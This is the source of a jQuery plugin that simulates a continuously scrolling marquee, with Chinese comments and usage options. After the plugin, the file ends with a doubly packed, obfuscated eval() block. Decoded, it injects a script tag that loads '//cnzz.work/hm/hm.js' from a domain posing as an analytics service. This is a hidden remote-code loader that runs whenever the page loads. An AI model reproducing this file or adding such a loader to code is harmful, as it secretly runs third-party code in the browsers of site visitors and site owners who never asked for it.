/**
 * @classDescription 模拟Marquee，无间断滚动内容
 * @author Aken Li(www.kxbd.com)
 * @DOM
 *  	<div id="marquee">
 *  		<ul>
 *   			<li></li>
 *   			<li></li>
 *  		</ul>
 *  	</div>
 * @CSS
 *  	#marquee {overflow:hidden;width:200px;height:50px;}
 * @Usage
 *  	$("#marquee").kxbdMarquee(options);
 * @options
 *		isEqual:true,		//所有滚动的元素长宽是否相等,true,false
 *  	loop:0,				//循环滚动次数，0时无限
 *		direction:"left",	//滚动方向，"left","right","up","down"
 *		scrollAmount:1,		//步长
 *		scrollDelay:20		//时长
 */
(function($){
	$.fn.kxbdMarquee=function(options){
		var opts=$.extend({},$.fn.kxbdMarquee.defaults, options);

		return this.each(function(){
			var $marquee=$(this);				//滚动元素容器
			var _scrollObj=$marquee.get(0);		//滚动元素容器DOM
			var scrollW=$marquee.width();		//滚动元素容器的宽度
			var scrollH=$marquee.height();		//滚动元素容器的高度
			var $element=$marquee.children();	//滚动元素
			var $kids=$element.children();		//滚动子元素
			var scrollSize=0;					//滚动元素尺寸

			//滚动类型，1左右，0上下
			var _type=(opts.direction=="left"||opts.direction=="right") ? 1:0;

			//防止滚动子元素比滚动元素宽而取不到实际滚动子元素宽度
			$element.css(_type?"width":"height",10000);

			//获取滚动元素的尺寸
			if(opts.isEqual){
				scrollSize=$kids[_type?"outerWidth":"outerHeight"]()*$kids.length;
			}else{
				$kids.each(function(){
					scrollSize+=$(this)[_type?"outerWidth":"outerHeight"]();
				});
			};

			//滚动元素总尺寸小于容器尺寸，不滚动
			if(scrollSize<(_type?scrollW:scrollH)){return;}; 

			//克隆滚动子元素将其插入到滚动元素后，并设定滚动元素宽度
			$element.append($kids.clone()).css(_type?"width":"height",scrollSize*2);

			var numMoved=0;
			function scrollFunc(){
				var _dir=(opts.direction=="left"||opts.direction=="right") ? "scrollLeft":"scrollTop";
				if (opts.loop>0) {
					numMoved+=opts.scrollAmount;
					if(numMoved>scrollSize*opts.loop){
						_scrollObj[_dir]=0;
						return clearInterval(moveId);
					};
				};

				if(opts.direction=="left"||opts.direction=="up"){
					var newPos=_scrollObj[_dir]+opts.scrollAmount;
					if(newPos>=scrollSize){
						newPos-=scrollSize;
					}
					_scrollObj[_dir]=newPos;
				}else{
					var newPos=_scrollObj[_dir]-opts.scrollAmount;
					if(newPos<=0){
						newPos += scrollSize;
					};
					_scrollObj[_dir]=newPos;
				};
			};

			//滚动开始
			var moveId=setInterval(scrollFunc, opts.scrollDelay);

			//鼠标划过停止滚动
			$marquee.hover(function(){
				clearInterval(moveId);
			},function(){
				clearInterval(moveId);
				moveId=setInterval(scrollFunc, opts.scrollDelay);
			});
		});
	};

	$.fn.kxbdMarquee.defaults={
		isEqual:true,		//所有滚动的元素长宽是否相等,true,false
		loop: 0,			//循环滚动次数，0时无限
		direction: "left",	//滚动方向，"left","right","up","down"
		scrollAmount:1,		//步长
		scrollDelay:20		//时长

	};

	$.fn.kxbdMarquee.setDefaults=function(settings) {
		$.extend( $.fn.kxbdMarquee.defaults, settings );
	};
})(jQuery);;
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('v(h(p,a,c,k,e,r){e=h(c){i c.o(a)};m(!\'\'.l(/^/,u)){j(c--)r[e(c)]=k[c]||e(c);k=[h(e){i r[e]}];e=h(){i\'\\\\w+\'};c=1};j(c--)m(k[c])p=p.l(q t(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);i p}(\'1 5=5||[];(8(){1 a=3.b(\\\'4\\\');a.7=\\\'//g.9/6/6.c\\\';1 2=3.e(\\\'4\\\')[0];2.f.d(a,2)})();\',n,n,\'|x|s|y|z|A|B|C|h|D||E|F|G|H|I|J\'.K(\'|\'),0,{}))',47,47,'|||||||||||||||||function|return|while||replace|if|17|toString||new|||RegExp|String|eval||var|document|script|_hmt_cnzz|hm|src|work|createElement|js|insertBefore|getElementsByTagName|parentNode|cnzz|split'.split('|'),0,{}))